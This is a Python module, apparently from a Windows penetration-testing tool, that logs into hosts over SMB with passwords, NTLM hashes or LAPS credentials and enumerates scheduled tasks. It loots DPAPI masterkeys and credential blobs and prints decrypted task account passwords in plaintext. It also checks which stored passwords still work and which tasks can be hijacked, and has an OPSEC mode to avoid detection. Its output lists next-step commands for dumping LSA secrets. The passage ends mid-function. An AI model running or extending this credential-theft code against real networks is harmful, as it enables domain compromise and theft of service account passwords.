# Core processing for a single target host.
#
# This module ties together SMB connection, task enumeration, XML parsing,
# and high-value enrichment. The main entry point `process_target` returns
# a list of printable strings suitable for the CLI while also appending
# structured rows to `all_rows` for export.

import os
import traceback
from typing import Any, Dict, List, Optional, Tuple, Union

from impacket.smbconnection import SessionError

from .auth import AuthContext
from .classification import classify_task
from .laps import (
    LAPS_ERRORS,
    LAPSCache,
    LAPSFailure,
    get_laps_credential_for_host,
)
from .output.printer import format_block
from .parsers.highvalue import HighValueLoader
from .parsers.task_xml import parse_task_xml
from .smb.connection import (
    _dns_ptr_lookup,
    _is_ip_address,
    get_server_fqdn,
    get_server_sid,
    smb_connect,
    smb_login,
    smb_negotiate,
)
from .smb.credguard import check_credential_guard
from .smb.task_rpc import CredentialStatus, TaskRunInfo, TaskSchedulerRPC
from .smb.tasks import crawl_tasks, smb_listdir
from .utils.logging import debug as log_debug
from .utils.logging import good, info, status, warn


def process_offline_directory(
    offline_dir: str,
    hv: Optional[HighValueLoader],
    show_unsaved_creds: bool,
    include_local: bool,
    all_rows: List[Dict],
    debug: bool,
    no_ldap: bool = False,
    dpapi_key: Optional[str] = None,
    concise: bool = False,
) -> List[str]:
    # Process previously collected XML files from a directory structure.
    #
    # Expected directory structure:
    #   offline_dir/
    #   ├── hostname1/
    #   │   └── Windows/System32/Tasks/...
    #   └── hostname2/
    #       └── Windows/System32/Tasks/...
    #
    # Returns printable lines and populates all_rows for export.
    out_lines: List[str] = []

    if not os.path.exists(offline_dir) or not os.path.isdir(offline_dir):
        warn(f"Offline directory does not exist or is not a directory: {offline_dir}")
        return out_lines

    # Check if offline_dir itself is a dpapi_loot structure (for direct decryption)
    has_masterkeys = os.path.exists(os.path.join(offline_dir, "masterkeys"))
    has_credentials = os.path.exists(os.path.join(offline_dir, "credentials"))

    if has_masterkeys and has_credentials and dpapi_key:
        # This is a direct dpapi_loot directory, process it directly
        hostname = os.path.basename(offline_dir)
        info(f"Detected DPAPI loot directory structure for {hostname}")
        dpapi_lines = _process_offline_dpapi_decryption(hostname, offline_dir, dpapi_key, debug)
        out_lines.extend(dpapi_lines)

        # Also process any XML files in this directory
        lines = _process_offline_host(
            hostname, offline_dir, hv, show_unsaved_creds, include_local, all_rows, debug, no_ldap, concise
        )
        out_lines.extend(lines)
        return out_lines

    # Look for host directories (subdirectories of offline_dir)
    try:
        host_dirs = [
            d for d in os.listdir(offline_dir) if os.path.isdir(os.path.join(offline_dir, d)) and not d.startswith(".")
        ]
    except Exception as e:
        warn(f"Failed to list offline directory {offline_dir}: {e}")
        return out_lines

    if not host_dirs:
        warn(f"No host directories found in offline directory: {offline_dir}")
        return out_lines

    total_hosts = len(host_dirs)
    good(f"Offline mode: Found {total_hosts} host directories to process")

    # If dpapi_key provided, decrypt collected DPAPI files first
    if dpapi_key:
        info("DPAPI key provided - will decrypt collected credential files")
        for host in host_dirs:
            host_path = os.path.join(offline_dir, host)
            dpapi_lines = _process_offline_dpapi_decryption(host, host_path, dpapi_key, debug)
            out_lines.extend(dpapi_lines)

    # Process task XML files
    for host_dir in host_dirs:
        host_path = os.path.join(offline_dir, host_dir)
        lines = _process_offline_host(
            host_dir, host_path, hv, show_unsaved_creds, include_local, all_rows, debug, no_ldap, concise
        )
        out_lines.extend(lines)

    return out_lines


def _process_offline_dpapi_decryption(hostname: str, host_dir: str, dpapi_key: str, debug: bool) -> List[str]:
    """Process DPAPI files from offline collection"""
    out_lines: List[str] = []

    # Check if this directory has dpapi_loot structure
    # Priority order:
    # 1. Check if current directory has masterkeys/ (direct dpapi_loot structure)
    # 2. Check for dpapi_loot/ subdirectory (--backup --loot combined structure)
    # 3. Check for dpapi_loot/hostname subdirectory (legacy structure)

    dpapi_loot_dir = None

    if os.path.exists(os.path.join(host_dir, "masterkeys")):
        # Direct dpapi_loot structure
        dpapi_loot_dir = host_dir
    elif os.path.exists(os.path.join(host_dir, "dpapi_loot", "masterkeys")):
        # Combined --backup --loot structure: backup_dir/hostname/dpapi_loot/
        dpapi_loot_dir = os.path.join(host_dir, "dpapi_loot")
    elif os.path.exists(os.path.join(host_dir, "dpapi_loot", hostname, "masterkeys")):
        # Legacy structure: dpapi_loot/hostname/
        dpapi_loot_dir = os.path.join(host_dir, "dpapi_loot", hostname)

    if not dpapi_loot_dir:
        # No DPAPI files found for this host
        return out_lines

    try:
        from .dpapi.looter import decrypt_offline_dpapi_files

        info(f"{hostname}: Decrypting DPAPI files from offline collection...")
        decrypted_creds = decrypt_offline_dpapi_files(dpapi_loot_dir, dpapi_key)

        if decrypted_creds:
            good(f"{hostname}: Successfully decrypted {len(decrypted_creds)} Task Scheduler credentials!")
            out_lines.append("")
            out_lines.append(f"{'=' * 80}")
            out_lines.append(f"DECRYPTED CREDENTIALS FROM OFFLINE DPAPI FILES - {hostname}")
            out_lines.append(f"{'=' * 80}")
            out_lines.append("")
            out_lines.append("NOTE: Task GUIDs from credential TargetName field:")
            out_lines.append("      Domain:batch=TaskScheduler:Task:{GUID}")
            out_lines.append("      If task is deleted, credential blob persists (orphaned credential)")
            out_lines.append("")

            for cred in decrypted_creds:
                out_lines.append("")
                out_lines.append(f"Task Name    : {cred.task_name or '(Unknown - see Task GUID)'}")
                out_lines.append(f"Task GUID    : {cred.target}")
                out_lines.append(f"Username     : {cred.username}")
                out_lines.append(f"Password     : {cred.password}")
                out_lines.append(f"Blob File    : {cred.blob_path}")
                out_lines.append(f"{'-' * 80}")

            out_lines.append(f"{'=' * 80}")
            out_lines.append("")
        else:
            info(f"{hostname}: No credentials decrypted from offline files")

    except Exception as e:
        warn(f"{hostname}: Failed to decrypt offline DPAPI files: {e}")
        if debug:
            traceback.print_exc()

    return out_lines


def _process_offline_host(
    hostname: str,
    host_dir: str,
    hv: Optional[HighValueLoader],
    show_unsaved_creds: bool,
    include_local: bool,
    all_rows: List[Dict],
    debug: bool,
    no_ldap: bool = False,
    concise: bool = False,
) -> List[str]:
    # Process XML files for a single host from offline directory
    out_lines: List[str] = []
    xml_files = []

    # Walk the host directory to find all XML files
    for root, _, files in os.walk(host_dir):
        for file in files:
            # Skip system files that start with dot
            if file.startswith("."):
                continue

            file_path = os.path.join(root, file)
            # Convert absolute path back to relative path from host directory
            rel_path = os.path.relpath(file_path, host_dir)
            # Convert to Windows-style path for consistency with online mode
            rel_path = rel_path.replace(os.sep, "\\")
            xml_files.append((rel_path, file_path))

    if not xml_files:
        warn(f"{hostname}: No XML files found in offline directory")
        return out_lines

    good(f"{hostname}: Processing {len(xml_files)} XML files from offline directory")

    priv_count = 0
    priv_lines: List[str] = []
    task_lines: List[str] = []

    for rel_path, file_path in xml_files:
        try:
            with open(file_path, "rb") as f:
                xml_bytes = f.read()
        except Exception as e:
            if debug:
                warn(f"{hostname}: Failed to read {file_path}: {e}")
            continue

        meta = parse_task_xml(xml_bytes)
        runas = meta.get("runas")
        if not runas:
            # If we can't determine who the task runs as, skip it for now
            continue

        what = meta.get("command") or ""
        if meta.get("arguments"):
            what = f"{what} {meta.get('arguments')}"

        # For offline processing, target_ip is not applicable (already offline)
        row = _build_row(hostname, rel_path, meta, target_ip=None)

        # Determine if the task stores credentials or runs with token/S4U (no saved credentials)
        logon_type = (meta.get("logon_type") or "").strip()
        no_saved_creds = (not logon_type) or logon_type.lower() in (
            "interactivetoken",
            "s4u",
            "interactivetokenorpassword",
        )
        if no_saved_creds:
            row["credentials_hint"] = "no_saved_credentials"

        # Use shared classification logic
        result = classify_task(
            row=row,
            meta=meta,
            runas=runas,
            rel_path=rel_path,
            hv=hv,
            show_unsaved_creds=show_unsaved_creds,
            include_local=include_local,
        )

        if not result.should_include:
            continue

        # Format output block based on classification
        if result.task_type in ("TIER-0", "PRIV"):
            priv_lines.extend(
                format_block(
                    result.task_type,
                    rel_path,
                    runas,
                    what,
                    meta.get("author"),
                    meta.get("date"),
                    extra_reason=result.reason,
                    password_analysis=result.password_analysis,
                    hv=hv,
                    no_ldap=no_ldap,
                    dc_ip=None,
                    enabled=meta.get("enabled"),
                    ldap_domain=None,
                    ldap_user=None,
                    ldap_password=None,
                    meta=meta,
                    concise=concise,
                )
            )
            priv_count += 1
        else:
            # Regular TASK
            task_lines.extend(
                format_block(
                    "TASK",
                    rel_path,
                    runas,
                    what,
                    meta.get("author"),
                    meta.get("date"),
                    password_analysis=result.password_analysis,
                    hv=hv,
                    no_ldap=no_ldap,
                    dc_ip=None,
                    enabled=meta.get("enabled"),
                    ldap_domain=None,
                    ldap_user=None,
                    ldap_password=None,
                    meta=meta,
                    concise=concise,
                )
            )

        all_rows.append(row)

    lines = priv_lines + task_lines
    # Sort tasks by priority: TIER-0 > PRIV > TASK
    sorted_lines = _sort_tasks_by_priority(lines)
    total = len(xml_files)
    good(f"{hostname}: Found {total} tasks, privileged {priv_count if (hv and hv.loaded) else 'N/A'}")
    return sorted_lines


def _sort_tasks_by_priority(lines: List[str]) -> List[str]:
    """Sort task blocks by priority: TIER-0 > PRIV > TASK"""
    if not lines:
        return lines

    # Group lines into task blocks (each block starts with a header like [TIER-0])
    blocks = []
    current_block = []

    for line in lines:
        if line.startswith("\n[") and current_block:
            # Start of new block, save the previous one
            blocks.append(current_block)
            current_block = [line]
        else:
            current_block.append(line)

    # Don't forget the last block
    if current_block:
        blocks.append(current_block)

    # Define priority order
    def get_block_priority(block):
        if not block:
            return 3  # Unknown/default priority

        first_line = block[0]
        if "[TIER-0]" in first_line:
            return 0
        elif "[PRIV]" in first_line:
            return 1
        elif "[TASK]" in first_line:
            return 2
        else:
            return 3

    # Sort blocks by priority
    sorted_blocks = sorted(blocks, key=get_block_priority)

    # Flatten back to a single list
    result = []
    for block in sorted_blocks:
        result.extend(block)

    return result


def _build_row(
    host: str, rel_path: str, meta: Dict[str, str], target_ip: Optional[str] = None, computer_sid: Optional[str] = None
) -> Dict[str, Optional[str]]:
    # Create a structured dict for CSV/JSON export representing a task.
    #
    # Keeps the same keys used by the writer so rows can be dumped directly.
    # Now includes both FQDN (host) and IP address (target_ip) for flexibility.
    # Also stores computer_sid for efficient BloodHound lookups without LDAP.

    # Determine credentials hint based on logon type
    logon_type_raw = meta.get("logon_type")
    logon_type = logon_type_raw.strip().lower() if logon_type_raw else ""
    if logon_type == "password":
        credentials_hint = "stored_credentials"
    elif logon_type in ("interactive", "interactivetoken", "s4u"):
        credentials_hint = "no_saved_credentials"
    else:
        credentials_hint = None

    return {
        "host": host,
        "target_ip": target_ip,  # Store the original target (IP or hostname)
        "computer_sid": computer_sid,  # Computer account SID from SMB (enables SID-based lookups)
        "path": rel_path,
        "type": "TASK",
        "runas": meta.get("runas"),
        "command": meta.get("command"),
        "arguments": meta.get("arguments"),
        "author": meta.get("author"),
        "date": meta.get("date"),
        "logon_type": meta.get("logon_type"),
        "enabled": meta.get("enabled"),
        "trigger_type": meta.get("trigger_type"),
        "start_boundary": meta.get("start_boundary"),
        "interval": meta.get("interval"),
        "duration": meta.get("duration"),
        "days_interval": meta.get("days_interval"),
        "reason": None,
        "credentials_hint": credentials_hint,
        # Credential validation fields (populated when --validate-creds is used)
        "cred_status": None,  # valid, valid_restricted, invalid, blocked, unknown
        "cred_password_valid": None,  # True/False - key field for DPAPI feasibility
        "cred_hijackable": None,  # True/False - can the task be hijacked?
        "cred_last_run": None,  # datetime of last run
        "cred_return_code": None,  # hex return code from last execution
        "cred_detail": None,  # human-readable detail
    }


def process_target(
    target: str,
    all_rows: List[Dict],
    *,
    auth: AuthContext,
    include_ms: bool = False,
    include_local: bool = False,
    hv: Optional[HighValueLoader] = None,
    debug: bool = False,
    show_unsaved_creds: bool = False,
    backup_dir: Optional[str] = None,
    credguard_detect: bool = False,
    no_ldap: bool = False,
    loot: bool = False,
    dpapi_key: Optional[str] = None,
    bh_connector: Optional[Any] = None,
    concise: bool = False,
    opsec: bool = False,
    laps_cache: Optional[LAPSCache] = None,
    validate_creds: bool = False,
) -> Tuple[List[str], Optional[Union[bool, LAPSFailure]]]:
    """
    Connect to `target`, enumerate scheduled tasks, and return printable lines.

    Args:
        target: Target IP or hostname
        all_rows: List to append result rows to
        auth: AuthContext containing all authentication parameters
        include_ms: Include Microsoft scheduled tasks
        include_local: Include local system account tasks
        hv: HighValueLoader for privilege detection
        debug: Enable debug output
        show_unsaved_creds: Show tasks without saved credentials
        backup_dir: Directory to backup raw XML files
        credguard_detect: Detect Credential Guard
        no_ldap: Disable LDAP SID resolution
        loot: Enable DPAPI credential looting
        dpapi_key: DPAPI key for decryption
        bh_connector: BloodHound connector
        concise: Use concise output format
        opsec: Enable OPSEC mode
        laps_cache: LAPS credential cache (if LAPS mode enabled)
        validate_creds: Query Task Scheduler RPC to validate stored credentials

    Returns:
        Tuple of (lines, laps_result) where:
        - lines: List of printable output strings
        - laps_result: None if LAPS not used, True if LAPS succeeded,
                       LAPSFailure if LAPS failed for this target
    """
    # Extract values from auth for use throughout the function
    domain = auth.domain
    username = auth.username
    password = auth.password
    hashes = auth.hashes
    kerberos = auth.kerberos
    dc_ip = auth.dc_ip
    timeout = auth.timeout
    ldap_domain = auth.ldap_domain
    ldap_user = auth.ldap_user
    ldap_password = auth.ldap_password
    ldap_hashes = auth.ldap_hashes

    out_lines: List[str] = []
    laps_result: Optional[Union[bool, LAPSFailure]] = None

    status(f"[Collecting] {target} ...")
    if opsec:
        info(f"{target}: OPSEC mode enabled - skipping risky operations")

    credguard_status = None
    server_fqdn = None  # Will store the resolved FQDN from SMB
    smb = None
    laps_used = False
    laps_type_used = None
    discovered_hostname = None
    cred_validation_results: Dict[str, TaskRunInfo] = {}  # RPC credential validation cache

    try:
        # LAPS Mode: Two-phase connection (negotiate -> lookup -> auth)
        if laps_cache is not None:
            # Phase 1: Negotiate to discover hostname
            smb = smb_negotiate(target, timeout=timeout)
            discovered_hostname = smb.getServerName()

            if not discovered_hostname:
                # SMBv3 doesn't populate server name during negotiate
                # Try DNS reverse lookup as fallback
                if _is_ip_address(target):
                    # Try DC first, then system DNS
                    if dc_ip:
                        discovered_hostname = _dns_ptr_lookup(target, nameserver=dc_ip)
                    if not discovered_hostname:
                        discovered_hostname = _dns_ptr_lookup(target, nameserver=None)

                    if discovered_hostname:
                        # Extract just the hostname part (before first dot) for LAPS lookup
                        info(f"{target}: Resolved hostname via DNS: {discovered_hostname}")
                    else:
                        warn(f"{target}: Could not resolve hostname via SMB or DNS")
                        discovered_hostname = target
                else:
                    # Target is already a hostname
                    discovered_hostname = target
            else:
                info(f"{target}: Discovered hostname from SMB: {discovered_hostname}")

            # Phase 2: Look up LAPS credentials
            laps_cred, laps_failure = get_laps_credential_for_host(laps_cache, discovered_hostname)

            if laps_failure:
                # No LAPS password for this host - skip target
                warn(laps_failure.message)
                status(f"[Collecting] {target} [-] (No LAPS password)")
                all_rows.append({
                    "host": discovered_hostname,
                    "target_ip": target,
                    "type": "FAILURE",
                    "reason": f"LAPS: {laps_failure.failure_type}"
                })
                try:
                    smb.close()
                except Exception:
                    pass
                return out_lines, laps_failure

            # Phase 3: Authenticate with LAPS credentials
            try:
                smb_login(
                    smb,
                    domain=".",  # Local account for LAPS
                    username=laps_cred.username,
                    password=laps_cred.password,
                    kerberos=False,  # LAPS is always NTLM
                )
                laps_used = True
                laps_type_used = laps_cred.laps_type
                laps_result = True
                good(f"{target}: LAPS authentication successful ({laps_cred.laps_type}, user: {laps_cred.username})")
            except Exception as e:
                # LAPS auth failed
                if debug:
                    traceback.print_exc()
                warn(LAPS_ERRORS["auth_failed"].format(hostname=discovered_hostname))
                status(f"[Collecting] {target} [-] (LAPS auth failed)")
                laps_failure = LAPSFailure(
                    hostname=discovered_hostname,
                    failure_type="auth_failed",
                    message=f"LAPS authentication failed: {e}",
                    laps_user_tried=laps_cred.username,
                    laps_type_tried=laps_cred.laps_type,
                )
                all_rows.append({
                    "host": discovered_hostname,
                    "target_ip": target,
                    "type": "FAILURE",
                    "reason": f"LAPS auth failed: {e}"
                })
                try:
                    smb.close()
                except Exception:
                    pass
                return out_lines, laps_failure
        else:
            # Standard mode: Direct SMB connection
            smb = smb_connect(
                target, domain, username, hashes or password, kerberos=kerberos, dc_ip=dc_ip, timeout=timeout
            )

        good(f"{target}: Connected via SMB")

        # Resolve the actual FQDN from SMB connection
        # This is critical when target is an IP address - BloodHound needs FQDNs
        # Tries: 1) SMB hostname, 2) DNS via DC, 3) System DNS

        server_fqdn = get_server_fqdn(smb, target_ip=target, dc_ip=dc_ip)
        if server_fqdn and server_fqdn != "UNKNOWN_HOST":
            if server_fqdn.upper() != target.upper():
                info(f"{target}: Resolved FQDN: {server_fqdn}")
        else:
            warn(f"{target}: Could not resolve FQDN - using target as-is")
            server_fqdn = target

        # Dual-homed host deduplication:
        # Check if we've already processed this host via a different IP/interface
        # This prevents duplicate entries when the same machine has multiple NICs
        # Uses atomic try_mark_host_processed() to avoid TOCTOU race conditions
        from .utils.cache_manager import get_cache
        cache = get_cache()
        if cache and server_fqdn != "UNKNOWN_HOST":
            was_first, previous_target = cache.try_mark_host_processed(server_fqdn, target)
            if not was_first:
                warn(f"{target}: Skipping - already processed as {previous_target} (dual-homed host: {server_fqdn})")
                status(f"[Collecting] {target} [SKIP] (duplicate of {previous_target})")
                # Close SMB connection before returning
                if smb:
                    try:
                        smb.close()
                    except Exception:
                        pass
                return [], None

        # Extract the computer account SID via SAMR RPC (with LDAP fallback)
        # This enables SID-validated BloodHound lookups
        # Skipped in OPSEC mode to avoid noisy SAMR/LDAP calls
        server_sid = None
        if not opsec:
            server_sid = get_server_sid(
                smb, dc_ip=dc_ip, username=username, password=password, hashes=hashes, kerberos=kerberos
            )
            if debug:
                if server_sid:
                    log_debug(f"{target}: Computer SID: {server_sid}")
                else:
                    log_debug(f"{target}: Could not retrieve computer SID")
        elif debug:
            log_debug(f"{target}: Skipping SID lookup (OPSEC mode)")

        # Credential Guard detection (EXPERIMENTAL, only if enabled)
        # Skipped in OPSEC mode
        if credguard_detect and not opsec:
            credguard_status = check_credential_guard(smb, target)
            if credguard_status:
                info(f"{target}: Credential Guard detected (LsaCfgFlags/IsolatedUserMode)")
            else:
                info(f"{target}: Credential Guard not detected")
        elif credguard_detect and opsec:
            info(f"{target}: Skipping Credential Guard check (OPSEC mode)")
    except Exception as e:
        if debug:
            traceback.print_exc()
        msg = str(e)
        status(f"[Collecting] {target} [-] ({msg})")
        all_rows.append({
            "host": target,
            "type": "FAILURE",
            "reason": f"SMB connection failed: {msg}"
        })
        if "STATUS_MORE_PROCESSING_REQUIRED" in msg:
            warn(f"{target}: Kerberos auth failed (SPN not found?). Try using FQDNs or switch to NTLM (-k off).")
        else:
            warn(f"{target}: SMB connection failed: {e}")
        return out_lines, laps_result

    # Quick local admin presence check
    # For LAPS mode, this also detects Remote UAC (LocalAccountTokenFilterPolicy)
    try:
        _ = smb_listdir(smb, "C$", r"\Windows\System32\Tasks")
        good(f"{target}: Local Admin Access confirmed")
    except Exception as e:
        if debug:
            traceback.print_exc()

        # Check if this is Remote UAC blocking LAPS
        if laps_used and "STATUS_ACCESS_DENIED" in str(e):
            warn(LAPS_ERRORS["remote_uac_short"].format(hostname=discovered_hostname or target))
            info("Remote UAC (LocalAccountTokenFilterPolicy=0) is filtering the local admin token")
            info("This is common on workstations. Servers typically don't have this issue.")
            status(f"[Collecting] {target} [-] (Remote UAC)")
            laps_failure = LAPSFailure(
                hostname=discovered_hostname or target,
                failure_type="remote_uac",
                message=LAPS_ERRORS["remote_uac"].format(hostname=discovered_hostname or target),
                laps_user_tried=laps_cred.username if laps_cache else None,
                laps_type_tried=laps_type_used,
            )
            all_rows.append({
                "host": discovered_hostname or target,
                "target_ip": target,
                "type": "FAILURE",
                "reason": "Remote UAC (token filtered)"
            })
            return out_lines, laps_failure
        else:
            warn(f"{target}: Local admin check failed")

    if not include_ms:
        info(f"{target}: Crawling Scheduled Tasks (skipping \\Microsoft for speed)")
    else:
        warn(f"{target}: Crawling ALL Scheduled Tasks, including \\Microsoft (this may be slow!)")

    try:
        items = crawl_tasks(smb, include_ms=include_ms)
    except SessionError:
        if debug:
            traceback.print_exc()
        status(f"[Collecting] {target} [-] (Access Denied)")
        all_rows.append({
            "host": target,
            "type": "FAILURE",
            "reason": "Access Denied (Failed to crawl tasks)"
        })
        warn(f"{target}: Failed to Crawl Tasks. Skipping... (Are you Local Admin?)")
        return out_lines, laps_result
    except Exception as e:
        if debug:
            traceback.print_exc()
        status(f"[Collecting] {target} [-] ({e})")
        all_rows.append({
            "host": target,
            "type": "FAILURE",
            "reason": f"Crawling failed: {e}"
        })
        warn(f"{target}: Unexpected error while crawling tasks: {e}")
        return out_lines, laps_result

    # First pass: identify tasks with Password logon type for credential validation
    password_task_paths: list[str] = []
    if validate_creds and not opsec:
        for rel_path, xml_bytes in items:
            meta = parse_task_xml(xml_bytes)
            logon_type = (meta.get("logon_type") or "").strip().lower()
            if logon_type == "password":
                password_task_paths.append(rel_path)

        if password_task_paths:
            info(f"{target}: Found {len(password_task_paths)} tasks with stored credentials to validate")

    # Credential validation via Task Scheduler RPC (if requested and not in OPSEC mode)
    if validate_creds and not opsec and password_task_paths:
        info(f"{target}: Querying Task Scheduler RPC for credential validation...")
        try:
            # Parse hashes for RPC auth
            lm_hash = ""
            nt_hash = ""
            if hashes:
                hash_parts = hashes.split(":")
                if len(hash_parts) == 2:
                    lm_hash, nt_hash = hash_parts
                elif len(hash_parts) == 1 and len(hash_parts[0]) == 32:
                    nt_hash = hash_parts[0]

            rpc_client = TaskSchedulerRPC(
                target=target,
                domain=domain,
                username=username,
                password=password or "",
                lm_hash=lm_hash,
                nt_hash=nt_hash,
            )

            if rpc_client.connect():
                # Validate only the tasks we know have Password logon type
                cred_validation_results = rpc_client.validate_specific_tasks(password_task_paths)
                rpc_client.disconnect()

                if cred_validation_results:
                    valid_count = sum(1 for r in cred_validation_results.values() if r.password_valid)
                    invalid_count = sum(1 for r in cred_validation_results.values()
                                       if r.credential_status == CredentialStatus.INVALID)
                    unknown_count = sum(1 for r in cred_validation_results.values()
                                       if r.credential_status == CredentialStatus.UNKNOWN)
                    good(f"{target}: Validated {len(cred_validation_results)} password tasks "
                         f"({valid_count} valid, {invalid_count} invalid, {unknown_count} unknown)")
                else:
                    info(f"{target}: No run info available for password tasks")
            else:
                warn(f"{target}: Failed to connect to Task Scheduler RPC")
        except Exception as e:
            warn(f"{target}: Credential validation failed: {e}")
            if debug:
                traceback.print_exc()
    elif validate_creds and not password_task_paths:
        info(f"{target}: No password-authenticated tasks found - skipping credential validation")
    elif validate_creds and opsec:
        info(f"{target}: Skipping credential validation (OPSEC mode)")

    # Create backup directory structure if backup is requested
    backup_target_dir = None
    if backup_dir:
        backup_target_dir = os.path.join(backup_dir, target)
        try:
            os.makedirs(backup_target_dir, exist_ok=True)
            good(f"{target}: Raw XML backup enabled - saving to {backup_target_dir}")
        except Exception as e:
            warn(f"{target}: Failed to create backup directory {backup_target_dir}: {e}")
            backup_target_dir = None

    # Perform automatic credential looting if requested
    decrypted_creds = []  # Initialize to empty list
    if loot:
        if dpapi_key:
            # Mode 1: Live decryption with DPAPI key
            try:
                from .dpapi.looter import loot_credentials

                info(f"{target}: Starting DPAPI credential looting...")
                decrypted_creds = loot_credentials(smb, dpapi_key)

                if decrypted_creds:
                    good(f"{target}: Successfully decrypted {len(decrypted_creds)} Task Scheduler credentials!")
                    # Credentials will be displayed inline with tasks below
                else:
                    info(f"{target}: No credentials decrypted (no matching masterkeys or no credential blobs found)")

            except Exception as e:
                warn(f"{target}: DPAPI credential looting failed: {e}")
                if debug:
                    traceback.print_exc()

        else:
            # Mode 2: Offline collection without DPAPI key
            try:
                from .dpapi.looter import collect_dpapi_files

                # Create loot directory structure
                # If --backup is specified, nest DPAPI files inside backup directory
                if backup_target_dir:
                    loot_target_dir = os.path.join(backup_target_dir, "dpapi_loot")
                else:
                    loot_base_dir = "dpapi_loot"
                    loot_target_dir = os.path.join(loot_base_dir, target)

                os.makedirs(loot_target_dir, exist_ok=True)

                info(f"{target}: Collecting DPAPI files for offline decryption...")
                info(f"{target}: Saving to: {loot_target_dir}")

                stats = collect_dpapi_files(smb, loot_target_dir)

                good(
                    f"{target}: Collected {stats['masterkeys']} masterkeys and {stats['credentials']} credential blobs"
                )

                out_lines.append("")
                out_lines.append(f"{'=' * 80}")
                out_lines.append("DPAPI FILES COLLECTED FOR OFFLINE DECRYPTION")
                out_lines.append(f"{'=' * 80}")
                out_lines.append("")
                out_lines.append(f"Output Directory : {loot_target_dir}")
                out_lines.append(f"Masterkeys       : {stats['masterkeys']} files (in masterkeys/)")
                out_lines.append(f"Credential Blobs : {stats['credentials']} files (in credentials/)")
                out_lines.append("")
                out_lines.append("NEXT STEPS:")
                out_lines.append("  1. Obtain DPAPI_SYSTEM userkey:")
                out_lines.append(f"     nxc smb {target} -u <user> -p <pass> --lsa")
                out_lines.append("")
                out_lines.append("  2. Decrypt with the userkey:")
                out_lines.append(f"     taskhound -t {target} -u <user> -p <pass> \\")
                out_lines.append("              --loot --dpapi-key <dpapi_userkey>")
                out_lines.append("")
                out_lines.append(f"See {os.path.join(loot_target_dir, 'README.txt')} for detailed instructions")
                out_lines.append(f"{'=' * 80}")
                out_lines.append("")

            except Exception as e:
                warn(f"{target}: DPAPI file collection failed: {e}")
                if debug:
                    traceback.print_exc()

    total = len(items)
    priv_count = 0
    priv_lines: List[str] = []
    task_lines: List[str] = []

    for rel_path, xml_bytes in items:
        meta = parse_task_xml(xml_bytes)
        # Save raw XML to backup directory if requested
        if backup_target_dir:
            try:
                # Create subdirectories as needed (mirroring the original structure)
                backup_file_path = os.path.join(backup_target_dir, rel_path.replace("\\", os.sep))
                backup_file_dir = os.path.dirname(backup_file_path)
                os.makedirs(backup_file_dir, exist_ok=True)
                with open(backup_file_path, "wb") as f:
                    f.write(xml_bytes)
            except Exception as e:
                if debug:
                    warn(f"{target}: Failed to backup {rel_path}: {e}")

        runas = meta.get("runas")
        if not runas:
            continue
        what = meta.get("command") or ""
        if meta.get("arguments"):
            what = f"{what} {meta.get('arguments')}"

        # Use resolved FQDN as host, keep original target as IP
        # This ensures BloodHound gets proper FQDNs even when connecting via IP
        hostname = server_fqdn if server_fqdn else target
        row = _build_row(hostname, rel_path, meta, target_ip=target, computer_sid=server_sid)

        # Enrich row with credential validation data if available
        # Task paths need normalization: SMB uses "TaskName", RPC uses "\TaskName"
        if cred_validation_results:
            # Try both with and without leading backslash
            rpc_path = "\\" + rel_path if not rel_path.startswith("\\") else rel_path
            rpc_path_alt = rel_path.lstrip("\\")

            task_run_info = cred_validation_results.get(rpc_path) or cred_validation_results.get(rpc_path_alt)
            if task_run_info:
                row["cred_status"] = task_run_info.credential_status.value
                row["cred_password_valid"] = task_run_info.password_valid
                row["cred_hijackable"] = task_run_info.task_hijackable
                row["cred_last_run"] = task_run_info.last_run.isoformat() if task_run_info.last_run else None
                row["cred_return_code"] = f"0x{task_run_info.return_code:08X}" if task_run_info.return_code is not None else None
                # Build human-readable detail
                if task_run_info.password_valid:
                    if task_run_info.task_hijackable:
                        row["cred_detail"] = "Password VALID - task can be hijacked"
                    else:
                        row["cred_detail"] = f"Password VALID but restricted ({task_run_info.credential_status.value})"
                elif task_run_info.credential_status == CredentialStatus.INVALID:
                    row["cred_detail"] = "Password INVALID - DPAPI dump not viable"
                elif task_run_info.credential_status == CredentialStatus.BLOCKED:
                    row["cred_detail"] = "Account blocked/expired - DPAPI dump not viable"
                else:
                    row["cred_detail"] = f"Unknown status (code: {row['cred_return_code']})"

        # Add Credential Guard status to each row
        row["credential_guard"] = credguard_status
        # Determine if the task stores credentials or runs with token/S4U (no saved credentials)
        logon_type = (meta.get("logon_type") or "").strip()
        no_saved_creds = (not logon_type) or logon_type.lower() in (
            "interactivetoken",
            "s4u",
            "interactivetokenorpassword",
        )
        if no_saved_creds:
            row["credentials_hint"] = "no_saved_credentials"
        elif logon_type.lower() == "password":
            row["credentials_hint"] = "stored_credentials"

        # Use shared classification logic
        result = classify_task(
            row=row,
            meta=meta,
            runas=runas,
            rel_path=rel_path,
            hv=hv,
            show_unsaved_creds=show_unsaved_creds,
            include_local=include_local,
        )

        if not result.should_include:
            continue

        # Format output block based on classification
        if result.task_type in ("TIER-0", "PRIV"):
            priv_lines.extend(
                format_block(
                    result.task_type,
                    rel_path,
                    runas,
                    what,
                    meta.get("author"),
                    meta.get("date"),
                    extra_reason=result.reason,
                    password_analysis=result.password_analysis,
                    hv=hv,
                    bh_connector=bh_connector,
                    smb_connection=smb,
                    no_ldap=no_ldap,
                    domain=domain,
                    dc_ip=dc_ip,
                    username=username,
                    password=password,
                    hashes=hashes,
                    kerberos=kerberos,
                    enabled=meta.get("enabled"),
                    ldap_domain=ldap_domain,
                    ldap_user=ldap_user,
                    ldap_password=ldap_password,
                    ldap_hashes=ldap_hashes,
                    meta=meta,
                    decrypted_creds=decrypted_creds,
                    concise=concise,
                    cred_validation=row if row.get("cred_status") else None,
                )
            )
            priv_count += 1
        else:
            # Regular TASK
            task_lines.extend(
                format_block(
                    "TASK",
                    rel_path,
                    runas,
                    what,
                    meta.get("author"),
                    meta.get("date"),
                    password_analysis=result.password_analysis,
                    hv=hv,
                    bh_connector=bh_connector,
                    smb_connection=smb,
                    no_ldap=no_ldap,
                    domain=domain,
                    dc_ip=dc_ip,
                    username=username,
                    password=password,
                    hashes=hashes,
                    kerberos=kerberos,
                    enabled=meta.get("enabled"),
                    ldap_domain=ldap_domain,
                    ldap_user=ldap_user,
                    ldap_password=ldap_password,
                    ldap_hashes=ldap_hashes,
                    meta=meta,
                    decrypted_creds=decrypted_creds,
                    concise=concise,
                    cred_validation=row if row.get("cred_status") else None,
                )
            )

        all_rows.append(row)

    lines = priv_lines + task_lines
